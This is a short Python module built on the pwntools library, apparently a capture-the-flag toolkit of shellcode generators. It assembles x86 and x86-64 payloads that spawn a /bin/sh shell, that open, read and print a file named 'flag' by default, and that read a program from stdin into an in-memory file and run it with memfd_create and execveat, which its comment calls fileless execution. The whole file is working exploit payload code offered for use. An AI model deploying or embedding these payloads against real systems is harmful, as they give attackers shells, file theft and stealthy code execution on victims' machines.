# -*- coding:utf-8 -*-
from pwn import *

def shellcode_execve64():
    code64=""" xor 	rdx,rdx
xor 	rsi,rsi			
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
mov al,0x3b
cdq
syscall
"""
    return asm(code64,arch = "amd64")

def shellcode_execve32():
    code32="""xor ecx,ecx
push 0xb
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
int 0x80
"""
    return asm(code32,arch = "i386")

def shellcode_readfile32(filename ='flag'):
    code = """xor ecx,ecx
mov eax,SYS_open
call here
.string "{}"
.byte 0
here:
pop ebx
int 0x80
mov ebx,eax
mov ecx,esp
mov edx,0x100
mov eax,SYS_read
int 0x80
mov ebx,1
mov ecx,esp
mov edx,0x100
mov eax,SYS_write
int 0x80
mov eax,SYS_exit
int 0x80
""".format(filename)
    return asm(code,arch="i386")

def shellcode_readfile64(filename ='flag'):
    code = """xor rsi,rsi
mov rax,SYS_open
call here
.string "{}"
here:
pop rdi
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,SYS_read
syscall
mov rdi,1
mov rsi,rsp
mov rdx,0x100
mov rax,SYS_write
syscall
mov rax,SYS_exit
syscall
""".format(filename)
    return asm(code,arch="amd64")


def shellcode_execveat():
    # 这个shellcode从文件读取输入,无文件执行从stdin输入到内存的文件
    code=shellcraft.pushstr("Q4n")+"""mov rax,319
mov rdi,rsp
xor rsi,rsi
syscall
mov rbx,rax
loop:
xor rdi,rdi
mov rsi,rsp
mov rdx,0x400
xor rax,rax
syscall
cmp rax,0
je go
mov rdi,rbx
mov rsi,rsp
mov rdx,rax
xor rax,rax
inc rax
syscall
jmp loop
go:
mov rdi,rbx
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
"""
    return asm(code,arch="amd64")